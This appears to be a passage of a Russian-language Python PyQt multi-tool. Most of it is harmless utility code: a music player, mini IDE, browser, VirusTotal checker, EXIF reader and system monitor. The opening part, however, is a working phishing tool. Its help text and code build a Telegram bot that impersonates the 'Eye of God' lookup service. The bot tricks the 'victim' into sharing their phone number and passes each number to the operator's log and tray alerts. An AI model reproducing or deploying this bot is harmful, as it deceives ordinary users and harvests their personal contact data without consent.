        self.minimize_button.setStyleSheet(button_style)
        layout.addWidget(self.minimize_button)

        self.help_button = QtWidgets.QPushButton("Справка", self)
        self.help_button.clicked.connect(self.help)
        self.help_button.setStyleSheet(button_style)
        layout.addWidget(self.help_button)

        self.log_output = QtWidgets.QTextEdit(self)
        self.log_output.setReadOnly(True)
        self.log_output.setStyleSheet(output_style)
        layout.addWidget(self.log_output)

        self.setLayout(layout)

        self.tray_icon = QSystemTrayIcon(QtGui.QIcon("icon.ico"), self)
        tray_menu = QMenu()
        restore_action = tray_menu.addAction("Развернуть")
        restore_action.triggered.connect(self.restore_from_tray)
        quit_action = tray_menu.addAction("Выход")
        quit_action.triggered.connect(QtWidgets.QApplication.quit)
        self.tray_icon.setContextMenu(tray_menu)
        self.tray_icon.activated.connect(self.tray_icon_activated)

    def help(self):
        QMessageBox.information(self, "Справка",
                                "Программа создает бота, который маскируется под Глаза Бога, и просит у пользователя номер телефона. Если пользователь отправит свой номер, то ты его получишь. Но учти, что бот не должен выключаться, пока жертва не даст свой номер, а то бот ей не ответит. Для этого я сделал кнопку добавления в трей. \n Инструкция, если не понимаешь:\n\n1: Впиши в поля токен твоего бота (бот создается через bot father) и свой телеграм ID (@getmyid_bot). Нажми на кнопку старта.\n\n2: Нажми на кнопку «Добавить в трей», чтобы бот не выключался, пока пользователь не предоставит номер телефона. \n \nБот будет просить у пользователя номер телефона. \n \nЕсли пользователь отправит номер, вы получите его в приложении.")

    def log(self, message):
        self.log_output.append(message)

    def is_valid_token(self, token):
        try:
            bot = telebot.TeleBot(token)
            bot_info = bot.get_me()
            if bot_info:
                return True
        except telebot.apihelper.ApiException:
            return False

    def start_bot(self):
        self.token = self.token_input.text().strip()
        self.admin_id = self.admin_id_input.text().strip()

        if not self.is_valid_token(self.token):
            self.log("<font color='red'>Неверный токен! Проверьте данные.</font>")
            return

        self.log("<font color='green'>Токен подтвержден. Бот запускается...</font>")
        self.bot = telebot.TeleBot(self.token)

        @self.bot.message_handler(commands=['start'])
        def send_welcome(message):
            markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
            button_phone = telebot.types.KeyboardButton(
                text="Подтверди номер телефона, чтобы воспользоваться ботом", request_contact=True)
            markup.add(button_phone)

            self.bot.send_message(
                message.chat.id,
                """
<b>Номер телефона</b>

Вам необходимо подтвердить <b>номер телефона</b> для идентификации.
Для этого нажмите кнопку ниже.
                """,
                parse_mode="HTML",
                reply_markup=markup,
            )

        @self.bot.message_handler(content_types=['contact'])
        def contact_handler(message):
            if message.contact and message.contact.user_id == message.from_user.id:
                markup = telebot.types.ReplyKeyboardRemove()
                self.bot.send_message(
                    message.chat.id,
                    """
⬇️ **Примеры команд для ввода:**

👤 **Поиск по имени**
├  `Блогер` (Поиск по тегу)
├  `Антипов Евгений Вячеславович`
└  `Антипов Евгений Вячеславович 05.02.1994`
 (Доступны также следующие форматы `05.02`/`1994`/`28`/`20-28`)

🚗 **Поиск по авто**
├  `Н777ОН777` - поиск авто по РФ
└  `WDB4632761X337915` - поиск по VIN

👨 **Социальные сети**
├  `instagram.com/ev.antipov` - Instagram
├  `vk.com/id577744097` - Вконтакте
├  `facebook.com/profile.php?id=1` - Facebook
└  `ok.ru/profile/162853188164` - Одноклассники

📱 `79999939919` - для поиска по номеру телефона
📨 `tema@gmail.com` - для поиска по Email
📧 `#281485304`, `@durov` или перешлите сообщение - поиск по Telegram аккаунту

🔐 `/pas churchill7` - поиск почты, логина и телефона по паролю
🏚 `/adr Москва, Тверская, д 1, кв 1` - информация по адресу (РФ)
🏘 `77:01:0001075:1361` - поиск по кадастровому номеру

🏛 `/company Сбербанк` - поиск по юр лицам
📑 `/inn 784806113663` - поиск по ИНН
🎫 `/snils 13046964250` - поиск по СНИЛС
📇 `/passport 6113825395` - поиск по паспорту
🗂 `/vy 9902371011` - поиск по ВУ

📸 Отправьте фото человека, чтобы найти его или двойника на сайтах ВК, ОК.
🚙 Отправьте фото номера автомобиля, чтобы получить о нем информацию.
🙂 Отправьте стикер, чтобы найти создателя.
🌎 Отправьте точку на карте, чтобы найти информацию.
🗣 С помощью голосовых команд также можно выполнять поисковые запросы.

Внимание! Бота могут в любое время заблокировать или сломать из за того, что он использует глаз бога неофициально. 

                        """,
                    parse_mode="Markdown",
                    reply_markup=markup,
                )
                self.tray_icon.showMessage(
                    "Fishing Telegram Bot",
                    f"Получен номер от {message.from_user.first_name}: {message.contact.phone_number}",
                    QSystemTrayIcon.Information,
                )
                self.log(
                    f"<b>Получен контакт:</b>\nID: {message.from_user.id}\nИмя: {message.from_user.first_name}\nТелефон: {message.contact.phone_number}")
            else:
                self.bot.send_message(message.chat.id, "Это не ваш номер телефона. Пожалуйста, подтвердите свой номер.")

        @self.bot.message_handler(func=lambda message: True)
        def default_handler(message):
            self.bot.send_message(message.chat.id, f"""
        ⚠️ **Технические работы.**

        Работы будут завершены в ближайший промежуток времени, простите за предоставленные неудобства.
        """, parse_mode="Markdown")

        self.polling_thread = BotPollingThread(self.bot)
        self.polling_thread.start()

    def minimize_to_tray(self):
        self.hide()
        self.tray_icon.show()
        self.tray_icon.showMessage("Fishing Telegram Bot", "Приложение свернуто в трей", QSystemTrayIcon.Information)

    def restore_from_tray(self):
        self.show()
        self.tray_icon.hide()

    def tray_icon_activated(self, reason):
        if reason == QSystemTrayIcon.Trigger:
            self.restore_from_tray()


class MusicSearchThread(QThread):
    search_done = pyqtSignal(list, str)

    def __init__(self, base_folder):
        super().__init__()
        self.base_folder = base_folder

    def run(self):
        try:
            music_dirs = set()
            for root, dirs, files in os.walk(self.base_folder):
                if any(file.endswith((".mp3", ".wav", ".ogg")) for file in files):
                    music_dirs.add(root)

            self.search_done.emit(list(music_dirs), "Directories loaded successfully.")
        except Exception as e:
            self.search_done.emit([], f"Error loading directories: {str(e)}")


class MusicPlayer(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Music Player by Endscape")
        self.setWindowIcon(QIcon("icon.ico"))
        self.setGeometry(300, 100, 400, 500)
        self.setFixedSize(400, 500)
        self.setStyleSheet(background)

        # Tray Icon Setup
        self.tray_icon = QSystemTrayIcon(self)
        self.tray_icon.setIcon(QIcon("icon.ico"))
        self.tray_icon.setVisible(True)

        tray_menu = QMenu(self)
        restore_action = QAction("Показать плеер", self)
        restore_action.triggered.connect(self.show)
        tray_menu.addAction(restore_action)
        quit_action = QAction("Выйти..", self)
        quit_action.triggered.connect(self.close)
        tray_menu.addAction(quit_action)

        self.tray_icon.setContextMenu(tray_menu)

        self.layout = QVBoxLayout()
        self.playlist = QListWidget(self)
        self.playlist.itemDoubleClicked.connect(self.play_music)
        self.playlist.setStyleSheet(list_style)
        self.layout.addWidget(self.playlist)

        control_layout = QHBoxLayout()
        self.prev_button = QPushButton("◁", self)
        self.prev_button.setStyleSheet(button_style)
        self.prev_button.clicked.connect(self.prev_track)
        control_layout.addWidget(self.prev_button)

        self.play_button = QPushButton("Play", self)
        self.play_button.setStyleSheet(button_style)
        self.play_button.clicked.connect(self.play_selected)
        control_layout.addWidget(self.play_button)

        self.stop_button = QPushButton("Stop", self)
        self.stop_button.setStyleSheet(button_style)
        self.stop_button.clicked.connect(self.stop_music)
        control_layout.addWidget(self.stop_button)

        self.next_button = QPushButton("▷", self)
        self.next_button.setStyleSheet(button_style)
        self.next_button.clicked.connect(self.next_track)
        control_layout.addWidget(self.next_button)

        self.layout.addLayout(control_layout)

        self.volume_slider = QSlider(Qt.Horizontal, self)
        self.volume_slider.setRange(0, 100)
        self.volume_slider.setValue(50)
        self.volume_slider.setStyleSheet(slider_style)
        self.volume_slider.valueChanged.connect(self.change_volume)
        self.layout.addWidget(self.volume_slider)

        self.progress_bar = QProgressBar(self)
        self.progress_bar.setRange(0, 100)
        self.progress_bar.setAlignment(Qt.AlignCenter)
        self.progress_bar.setStyleSheet(progress_bar_style)
        self.layout.addWidget(self.progress_bar)

        self.status_label = QLabel("Статус: пока ничего..", self)
        self.status_label.setStyleSheet("font-size: 14px; color: #aaa;")
        self.layout.addWidget(self.status_label)

        self.search_folder_button = QPushButton("Выбери папку с музыкой", self)
        self.search_folder_button.setStyleSheet(button_style)
        self.search_folder_button.clicked.connect(self.select_folder)
        self.layout.addWidget(self.search_folder_button)

        self.setLayout(self.layout)

        self.player = QMediaPlayer()
        self.player.positionChanged.connect(self.update_progress)
        self.player.durationChanged.connect(self.update_duration)

        self.duration = 0
        self.music_files = []
        self.current_index = 0

    def select_folder(self):
        folder = QFileDialog.getExistingDirectory(self, "Выбери папку", os.path.expanduser("~"))
        if folder:
            self.load_music_from_folder(folder)

    def load_music_from_folder(self, folder_or_item):
        folder = folder_or_item.text(0) if isinstance(folder_or_item, QTreeWidgetItem) else folder_or_item

        if not os.path.isdir(folder):
            self.status_label.setText("Выбрана неверная папка")
            return

        try:
            self.music_files = [os.path.join(folder, f) for f in os.listdir(folder) if
                                f.endswith((".mp3", ".wav", ".ogg"))]
            self.playlist.clear()

            if self.music_files:
                self.playlist.addItems([os.path.basename(f) for f in self.music_files])
                self.status_label.setText(f"Loaded {len(self.music_files)} tracks.")
            else:
                self.status_label.setText("В этой папке не найдено поддерживаемых музыкальных файлов")
        except Exception as e:
            self.status_label.setText(f"Ошибка загрузки файлов: {str(e)}")

    def play_music(self, item):
        self.current_index = self.playlist.row(item)
        self.play_current_track()

    def play_selected(self):
        selected_item = self.playlist.currentItem()
        if selected_item:
            self.play_music(selected_item)

    def play_current_track(self):
        self.player.stop()
        music_file = self.music_files[self.current_index]
        self.player.setMedia(QMediaContent(QUrl.fromLocalFile(music_file)))
        self.player.play()
        self.status_label.setText(f"Играет: {os.path.basename(music_file)}")

    def stop_music(self):
        self.player.stop()
        self.status_label.setText("Остановлено")

    def prev_track(self):
        if self.music_files:
            self.current_index = (self.current_index - 1) % len(self.music_files)
            self.play_current_track()

    def next_track(self):
        if self.music_files:
            self.current_index = (self.current_index + 1) % len(self.music_files)
            self.play_current_track()

    def change_volume(self):
        volume = self.volume_slider.value()
        self.player.setVolume(volume)

    def update_progress(self, position):
        if self.duration > 0:
            progress = int((position / self.duration) * 100)
            self.progress_bar.setValue(progress)

    def update_duration(self, duration):
        self.duration = duration

    def closeEvent(self, event):
        reply = QMessageBox.question(
            self, 'Выйти?', "Ты уверен в своем решении?",
            QMessageBox.Yes | QMessageBox.No, QMessageBox.No
        )
        if reply == QMessageBox.Yes:
            event.accept()
        else:
            event.ignore()


class MiniIDE(QMainWindow):
    def __init__(self):
        super().__init__()

        self.setWindowTitle("Endscape Mini IDE")
        self.setWindowIcon(QIcon("icon.ico"))
        self.setGeometry(100, 100, 800, 600)
        self.setStyleSheet(background)

        layout = QVBoxLayout()

        toolbar = QToolBar("Toolbar")
        self.addToolBar(toolbar)

        save_action = QAction("Сохранить", self)
        save_action.triggered.connect(self.save_file)
        toolbar.addAction(save_action)

        open_action = QAction("Oткрыть", self)
        open_action.triggered.connect(self.open_file)
        toolbar.addAction(open_action)

        clear_output_action = QAction("Очистить вывод", self)
        clear_output_action.triggered.connect(self.clear_output)
        toolbar.addAction(clear_output_action)

        create_env_action = QAction("Создать виртуальное окружение", self)
        create_env_action.triggered.connect(self.create_virtual_env)
        toolbar.addAction(create_env_action)

        install_package_action = QAction("Установить пакет", self)
        install_package_action.triggered.connect(self.install_package)
        toolbar.addAction(install_package_action)

        self.recent_files_menu = QMenu("Recent Files", self)
        self.menuBar().addMenu(self.recent_files_menu)

        self.code_editor = CodeEditor()
        self.code_editor.setStyleSheet(text_input_style)
        self.code_editor.setPlaceholderText("Напиши код..")

        self.output_display = QTextEdit()
        self.output_display.setStyleSheet(output_style)
        self.output_display.setReadOnly(True)

        self.run_button = QPushButton("Запустить")
        self.run_button.setStyleSheet(button_style)
        self.run_button.clicked.connect(self.run_code)

        self.progress_bar = QProgressBar()
        self.progress_bar.setStyleSheet(progress_bar_style)
        self.progress_bar.setVisible(False)

        splitter = QSplitter(Qt.Vertical)
        splitter.addWidget(self.code_editor)
        splitter.addWidget(self.output_display)

        layout.addWidget(splitter)
        layout.addWidget(self.run_button)
        layout.addWidget(self.progress_bar)

        container = QWidget()
        container.setLayout(layout)
        self.setCentralWidget(container)

        self.recent_files = []

    def run_code(self):
        code = self.code_editor.toPlainText()

        if not code.strip():
            self.output_display.setText("No code to run.")
            return

        self.progress_bar.setVisible(True)
        self.progress_bar.setRange(0, 0)

        def execute_code():
            try:
                process = subprocess.Popen(
                    [sys.executable, "-c", code],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )
                for line in iter(process.stdout.readline, ''):
                    self.output_display.append(line)
                stderr = process.stderr.read()
                if stderr:
                    self.output_display.append(f"\nErrors:\n{stderr}")
            except Exception as e:
                self.output_display.setText(f"Error: {str(e)}")
            finally:
                self.progress_bar.setVisible(False)

        threading.Thread(target=execute_code, daemon=True).start()

    def save_file(self):
        options = QFileDialog.Options()
        file_path, _ = QFileDialog.getSaveFileName(self, "Save File", "", "Python Files (*.py);;All Files (*)", options=options)
        if file_path:
            try:
                with open(file_path, 'w') as file:
                    file.write(self.code_editor.toPlainText())
                self.update_recent_files(file_path)
                QMessageBox.information(self, "File Saved", "File saved successfully!")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Could not save file: {str(e)}")

    def open_file(self):
        options = QFileDialog.Options()
        file_path, _ = QFileDialog.getOpenFileName(self, "Open File", "", "Python Files (*.py);;All Files (*)", options=options)
        if file_path:
            try:
                with open(file_path, 'r') as file:
                    self.code_editor.setPlainText(file.read())
                self.update_recent_files(file_path)
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Could not open file: {str(e)}")

    def clear_output(self):
        self.output_display.clear()

    def create_virtual_env(self):
        options = QFileDialog.Options()
        dir_path = QFileDialog.getExistingDirectory(self, "Выбери папку для виртуального окружения", options=options)
        if dir_path:
            env_path = os.path.join(dir_path, "venv")
            try:
                subprocess.check_call([sys.executable, "-m", "venv", env_path])
                QMessageBox.information(self, "Виртуальное окружение", f"Виртуальное окружение создано в {env_path}")
            except Exception as e:
                QMessageBox.critical(self, "Ошибка(", f"Не получилось создать виртуальное окружение: {str(e)}")

    def install_package(self):
        package, ok = QInputDialog.getText(self, "Установить пакет", "Выбери имя пакета:")
        if ok and package.strip():
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", package.strip()])
                QMessageBox.information(self, "Package Installation", f"Package '{package}' installed successfully!")
            except subprocess.CalledProcessError as e:
                QMessageBox.critical(self, "Ошибка", f"Не удалось установить пакет: {str(e)}")
            except Exception as e:
                QMessageBox.critical(self, "Ошибка", f"An unexpected error occurred: {str(e)}")

    def update_recent_files(self, file_path):
        if file_path not in self.recent_files:
            self.recent_files.append(file_path)
        if len(self.recent_files) > 5:
            self.recent_files.pop(0)
        self.refresh_recent_files_menu()

    def refresh_recent_files_menu(self):
        self.recent_files_menu.clear()
        for file_path in self.recent_files:
            action = QAction(file_path, self)
            action.triggered.connect(lambda _, p=file_path: self.open_recent_file(p))
            self.recent_files_menu.addAction(action)

    def open_recent_file(self, file_path):
        try:
            with open(file_path, 'r') as file:
                self.code_editor.setPlainText(file.read())
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Could not open file: {str(e)}")


class CodeEditor(QTextEdit):
    def keyPressEvent(self, event):
        cursor = self.textCursor()

        pairs = {
            Qt.Key_ParenLeft: '()',
            Qt.Key_BraceLeft: '{}',
            Qt.Key_BracketLeft: '[]',
            Qt.Key_QuoteDbl: '""',
            Qt.Key_Apostrophe: "''",
        }

        if event.key() in pairs:
            pair = pairs[event.key()]
            self.insertPlainText(pair)
            cursor.movePosition(cursor.Left)
            self.setTextCursor(cursor)
        else:
            super().keyPressEvent(event)

class DownloadThread(QThread):
    download_finished = pyqtSignal(str)
    download_error = pyqtSignal(str)

    def __init__(self, download, download_path):
        super().__init__()
        self.download = download
        self.download_path = download_path

    def run(self):
        try:
            self.download.setPath(self.download_path)
            self.download.accept()
            self.download_finished.emit(f"Файл сохранен: {self.download_path}")
        except Exception as e:
            self.download_error.emit(f"Ошибка скачивания: {str(e)}")


class SettingsDialog(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle("Настройки")
        self.setWindowIcon(QIcon("icon.ico"))
        self.setGeometry(200, 200, 400, 300)

        layout = QFormLayout()

        self.proxy_checkbox = QCheckBox("Включить прокси:")
        self.proxy_address_input = QLineEdit()
        self.proxy_address_input.setPlaceholderText("Адрес прокси")
        self.proxy_address_input.setStyleSheet(text_input_style)
        layout.addRow("Включить прокси:", self.proxy_checkbox)
        layout.addRow("Адрес прокси:", self.proxy_address_input)

        self.homepage_input = QLineEdit("https://www.google.com")
        self.homepage_input.setStyleSheet(text_input_style)
        layout.addRow("Домашняя страница:", self.homepage_input)

        self.search_engine_combo = QComboBox()
        self.search_engine_combo.addItems(["Google", "Bing", "DuckDuckGo", "Yandex"])
        self.search_engine_combo.setStyleSheet(selector_style)
        layout.addRow("Поисковая система:", self.search_engine_combo)

        button_box = QDialogButtonBox(QDialogButtonBox.Save | QDialogButtonBox.Cancel)
        button_box.setStyleSheet(button_style)
        button_box.accepted.connect(self.accept)
        button_box.rejected.connect(self.reject)
        layout.addWidget(button_box)

        self.setLayout(layout)

    def get_settings(self):
        return {
            "proxy_enabled": self.proxy_checkbox.isChecked(),
            "proxy_address": self.proxy_address_input.text(),
            "homepage": self.homepage_input.text(),
            "search_engine": self.search_engine_combo.currentText(),
        }


class Browser(QMainWindow):
    SETTINGS_FILE = "browser_settings.json"
    HISTORY_FILE = "browser_history.json"
    BOOKMARKS_FILE = "browser_bookmarks.json"

    def __init__(self):
        super().__init__()
        self.setWindowTitle("Endscape Browser")
        self.setWindowIcon(QIcon("icon.ico"))
        self.setGeometry(100, 100, 1024, 768)
        self.setStyleSheet(background)

        self.settings = self.load_settings()
        self.history = self.load_json(self.HISTORY_FILE)
        self.bookmarks = self.load_json(self.BOOKMARKS_FILE)

        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        layout = QVBoxLayout()
        central_widget.setLayout(layout)

        self.tabs = QTabWidget()
        self.tabs.setTabsClosable(True)
        self.tabs.setStyleSheet(tab_widget_style)
        self.tabs.tabCloseRequested.connect(self.close_tab)
        layout.addWidget(self.tabs)

        nav_bar = QHBoxLayout()
        self.url_bar = QLineEdit()
        self.url_bar.setPlaceholderText("Enter URL or search query")
        self.url_bar.setStyleSheet(text_input_style)
        self.url_bar.returnPressed.connect(self.load_url)

        self.back_button = QPushButton("Назад")
        self.back_button.setStyleSheet(button_style)
        self.back_button.clicked.connect(self.go_back)

        self.forward_button = QPushButton("Вперед")
        self.forward_button.setStyleSheet(button_style)
        self.forward_button.clicked.connect(self.go_forward)

        self.reload_button = QPushButton("Обновить")
        self.reload_button.setStyleSheet(button_style)
        self.reload_button.clicked.connect(self.reload_page)

        self.new_tab_button = QPushButton("Новая вкладка")
        self.new_tab_button.setStyleSheet(button_style)
        self.new_tab_button.clicked.connect(self.new_tab)

        nav_bar.addWidget(self.back_button)
        nav_bar.addWidget(self.forward_button)
        nav_bar.addWidget(self.reload_button)
        nav_bar.addWidget(self.url_bar)
        nav_bar.addWidget(self.new_tab_button)
        layout.addLayout(nav_bar)

        self.new_tab()

        menu_bar = self.menuBar()

        settings_menu = menu_bar.addMenu("Settings")
        settings_action = QAction("Browser Settings", self)
        settings_action.triggered.connect(self.open_settings_dialog)
        settings_menu.addAction(settings_action)

        history_menu = menu_bar.addMenu("History")
        view_history_action = QAction("View History", self)
        view_history_action.triggered.connect(self.view_history)
        history_menu.addAction(view_history_action)

        bookmarks_menu = menu_bar.addMenu("Bookmarks")
        view_bookmarks_action = QAction("View Bookmarks", self)
        view_bookmarks_action.triggered.connect(self.view_bookmarks)
        bookmarks_menu.addAction(view_bookmarks_action)

    def new_tab(self, url=None):
        browser = QWebEngineView()

        browser.settings().setAttribute(QWebEngineSettings.PluginsEnabled, True)
        browser.settings().setAttribute(QWebEngineSettings.JavascriptEnabled, True)

        browser.page().profile().downloadRequested.connect(self.handle_download)

        browser.setUrl(QUrl(url or self.settings["homepage"]))
        browser.urlChanged.connect(lambda q: self.url_bar.setText(q.toString()))
        browser.loadFinished.connect(self.handle_load_finished)

        index = self.tabs.addTab(browser, "New")
        self.tabs.setCurrentIndex(index)

    def handle_load_finished(self, success):
        if not success:
            current_browser = self.tabs.currentWidget()
            if not current_browser:
                return

            try:
                error_html = """
                    <html>
                        <head>
                            <title>Ошибка загрузки</title>
                        </head>
                        <body>
                            <h1>Ошибка 409: Запрос не может быть выполнен</h1>
                            <p>Пожалуйста, проверьте URL или попробуйте снова позже.</p>
                        </body>
                    </html>
                """
                current_browser.setHtml(error_html)
            except Exception as e:
                print(f"Error setting HTML for error page: {e}")

    def handle_download(self, download: QWebEngineDownloadItem):
        save_path, _ = QFileDialog.getSaveFileName(self, "Сохранить файл", download.suggestedFileName())
        if save_path:
            try:
                download.setPath(save_path)
                download.accept()
                QMessageBox.information(self, "Скачивание завершено", f"Файл успешно сохранен: {save_path}")
            except Exception as e:
                QMessageBox.critical(self, "Ошибка скачивания", f"Не удалось сохранить файл: {str(e)}")

    def close_tab(self, index):
        if self.tabs.count() > 1:
            self.tabs.removeTab(index)

    def load_url(self):
        url = self.url_bar.text()
        if not url.startswith("http://") and not url.startswith("https://"):
            search_engine = self.settings["search_engine"].lower()
            if search_engine == "google":
                url = f"https://www.google.com/search?q={url}"
            elif search_engine == "bing":
                url = f"https://www.bing.com/search?q={url}"
            elif search_engine == "duckduckgo":
                url = f"https://duckduckgo.com/?q={url}"
            elif search_engine == "yandex":
                url = f"https://yandex.com/search/?text={url}"
        current_browser = self.tabs.currentWidget()
        current_browser.setUrl(QUrl(url))
        self.add_to_history(url)

    def go_back(self):
        self.tabs.currentWidget().back()

    def go_forward(self):
        self.tabs.currentWidget().forward()

    def reload_page(self):
        self.tabs.currentWidget().reload()

    def open_settings_dialog(self):
        dialog = SettingsDialog(self)
        dialog.proxy_checkbox.setChecked(self.settings.get("proxy_enabled", False))
        dialog.proxy_address_input.setText(self.settings.get("proxy_address", ""))
        dialog.homepage_input.setText(self.settings.get("homepage", "https://www.google.com"))
        dialog.search_engine_combo.setCurrentText(self.settings.get("search_engine", "Google"))

        if dialog.exec_() == QDialog.Accepted:
            self.settings.update(dialog.get_settings())
            self.save_settings()

    def add_to_history(self, url):
        self.history.append(url)
        self.save_json(self.HISTORY_FILE, self.history)

    def view_history(self):
        dialog = QDialog(self)
        dialog.setWindowTitle("History")
        layout = QVBoxLayout()
        tree = QTreeWidget()
        tree.setHeaderLabels(["Visited URLs"])
        for url in self.history:
            QTreeWidgetItem(tree, [url])
        layout.addWidget(tree)
        dialog.setLayout(layout)
        dialog.exec_()

    def view_bookmarks(self):
        dialog = QDialog(self)
        dialog.setWindowTitle("Bookmarks")
        layout = QVBoxLayout()
        tree = QTreeWidget()
        tree.setHeaderLabels(["Bookmarks"])
        for bookmark in self.bookmarks:
            QTreeWidgetItem(tree, [bookmark])
        layout.addWidget(tree)
        dialog.setLayout(layout)
        dialog.exec_()

    def load_settings(self):
        if os.path.exists(self.SETTINGS_FILE):
            return self.load_json(self.SETTINGS_FILE, {
                "proxy_enabled": False,
                "proxy_address": "",
                "homepage": "https://www.google.com",
                "search_engine": "Google",
            })
        return {
            "proxy_enabled": False,
            "proxy_address": "",
            "homepage": "https://www.google.com",
            "search_engine": "Google",
        }

    def save_settings(self):
        self.save_json(self.SETTINGS_FILE, self.settings)

    def load_json(self, filename, default=None):
        try:
            if os.path.exists(filename):
                with open(filename, "r") as f:
                    return json.load(f)
        except Exception as e:
            print(f"Ошибка при загрузке {filename}: {e}")
        return default or {}

    def save_json(self, filename, data):
        try:
            with open(filename, "w") as f:
                json.dump(data, f, ensure_ascii=False, indent=4)
        except Exception as e:
            print(f"Ошибка при сохранении {filename}: {e}")

API_KEY = "VIRUSTOTAL API"

class VirusTotalWorker(QThread):
    progress = pyqtSignal(str)
    result = pyqtSignal(dict)
    error = pyqtSignal(str)

    def __init__(self, file_path, parent=None):
        super().__init__(parent)
        self.file_path = file_path

    def run(self):
        try:
            file_size = os.path.getsize(self.file_path)
            if file_size > 32 * 1024 * 1024:
                self.progress.emit(f"Размер файла ({file_size / (1024 * 1024):.2f} MB) превышает лимит 32 мб")
                self.progress.emit("Please use the 'big files' API or upload a smaller file.")
                return

            self.progress.emit("Загрузка файла на VirusTotal...")
            with open(self.file_path, "rb") as file:
                response = requests.post(
                    "https://www.virustotal.com/api/v3/files",
                    headers={"x-apikey": API_KEY},
                    files={"file": file}
                )

                if response.status_code == 200:
                    data = response.json()
                    analysis_id = data["data"]["id"]
                    self.progress.emit("Файл успешно загружен. Ждем результатов...")
                    self.fetch_analysis_results(analysis_id)
                else:
                    self.error.emit(f"Ошибка загрузки файла: {response.text}")
        except Exception as e:
            self.error.emit(f"An error occurred: {str(e)}")

    def fetch_analysis_results(self, analysis_id):
        try:
            url = f"https://www.virustotal.com/api/v3/analyses/{analysis_id}"

            i=0

            while True:
                response = requests.get(url, headers={"x-apikey": API_KEY})

                if response.status_code == 200:
                    data = response.json()
                    status = data["data"]["attributes"]["status"]

                    if status == "completed":
                        self.result.emit(data)
                        break
                    else:
                        self.progress.emit(f"В процессе {i} секунд")
                        i = i+1
                        time.sleep(1)
                else:
                    self.error.emit(f"Error fetching analysis: {response.text}")
                    break
        except Exception as e:
            self.error.emit(f"An error occurred: {str(e)}")

class VirusTotalChecker(QMainWindow):
    def __init__(self):
        super().__init__()

        self.setWindowTitle("VirusTotal File Checker by Endscape")
        self.setGeometry(100, 100, 400, 300)
        self.setWindowIcon(QIcon("icon.ico"))
        self.setStyleSheet(background)

        # Main layout
        layout = QVBoxLayout()

        # File selection label
        self.file_label = QLabel("Файл не выбран")
        self.file_label.setFont(QFont("Arial", 12))
        layout.addWidget(self.file_label)

        # Select file button
        self.select_file_button = QPushButton("Выбрать файл")
        self.select_file_button.setStyleSheet(button_style)
        self.select_file_button.clicked.connect(self.select_file)
        layout.addWidget(self.select_file_button)

        # Check file button
        self.check_file_button = QPushButton("Проверить файл")
        self.check_file_button.setStyleSheet(button_style)
        self.check_file_button.clicked.connect(self.start_file_check)
        self.check_file_button.setEnabled(False)
        layout.addWidget(self.check_file_button)

        self.output_display = QTextEdit()
        self.output_display.setReadOnly(True)
        self.output_display.setStyleSheet(output_style)
        layout.addWidget(self.output_display)

        container = QWidget()
        container.setLayout(layout)
        self.setCentralWidget(container)

        self.file_path = None
        self.worker = None

    def select_file(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Выбрать файл")
        if file_path:
            self.file_path = file_path
            self.file_label.setText(f"Выбрано: {os.path.basename(file_path)}")
            self.check_file_button.setEnabled(True)

    def start_file_check(self):
        if not self.file_path:
            QMessageBox.warning(self, "Warning", "Файл не выбран.")
            return

        self.output_display.clear()
        self.output_display.append("Старт проверки файла...")

        self.worker = VirusTotalWorker(self.file_path)
        self.worker.progress.connect(self.update_progress)
        self.worker.result.connect(self.display_results)
        self.worker.error.connect(self.show_error)
        self.worker.start()

    def update_progress(self, message):
        self.output_display.append(message)

    def display_results(self, data):
        self.output_display.append("\n--- Analysis Results ---")

        try:
            stats = data["meta"]["file_info"]
            results = data["data"]["attributes"]["results"]

            self.output_display.append(f"Filename: {stats.get('name', 'Unknown')}\n")

            for scanner, result in results.items():
                detected = result.get("detected", False)
                self.output_display.append(f"{scanner}: {'Detected' if detected else 'Clean'}")

            self.output_display.append("\n--- End of Results ---")
        except KeyError:
            self.output_display.append("Error parsing analysis results.")

    def show_error(self, message):
        self.output_display.append(f"Error: {message}")

class MetadataParserApp(QWidget):
    def __init__(self):
        super().__init__()

        self.initUI()

    def initUI(self):
        self.setWindowTitle("Endscape Metadata Parser")
        self.setWindowIcon(QIcon("icon.ico"))
        self.setGeometry(100, 100, 400, 300)
        self.setStyleSheet(background)

        self.layout = QVBoxLayout()

        self.label = QLabel("Выберите файл изображения для парсинга метаданных", self)
        self.layout.addWidget(self.label)

        self.openButton = QPushButton("Открыть файл", self)
        self.openButton.setStyleSheet(button_style)
        self.openButton.clicked.connect(self.openFileDialog)
        self.layout.addWidget(self.openButton)

        self.textEdit = QTextEdit(self)
        self.setStyleSheet(output_style)
        self.layout.addWidget(self.textEdit)

        self.setLayout(self.layout)

    def openFileDialog(self):
        options = QFileDialog.Options()
        filePath, _ = QFileDialog.getOpenFileName(self, "Выберите файл", "", "Images (*.png *.jpg *.jpeg *.bmp *.gif)",
                                                  options=options)

        if filePath:
            self.extractMetadata(filePath)

    def extractMetadata(self, filePath):
        try:
            img = Image.open(filePath)

            exif_data = img._getexif()

            if exif_data:
                metadata = ""
                for tag, value in exif_data.items():
                    tag_name = TAGS.get(tag, tag)
                    metadata += f"{tag_name}: {value}\n"
                self.textEdit.setPlainText(metadata)
            else:
                self.textEdit.setPlainText("Нет EXIF-метаданных в этом изображении.")
        except Exception as e:
            self.textEdit.setPlainText(f"Ошибка при чтении метаданных: {e}")

class SystemMonitor(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("System Monitor by Endscape")
        self.setWindowIcon(QIcon("icon.ico"))
        self.setGeometry(100, 100, 400, 300)
        self.setStyleSheet(background)

        self.layout = QVBoxLayout()

        self.tabs = QTabWidget(self)
        self.tabs.setStyleSheet(tab_widget_style)
        self.layout.addWidget(self.tabs)

        self.add_process_tab()
        self.add_network_tab()
        self.add_device_tab()

        self.setLayout(self.layout)

        self.timer = QTimer(self)
        self.timer.timeout.connect(self.update_cpu_memory_usage)
        self.timer.start(3000)

    def add_process_tab(self):
        process_tab = QWidget()
        process_layout = QVBoxLayout()

        self.title_label = QLabel("System Monitor")
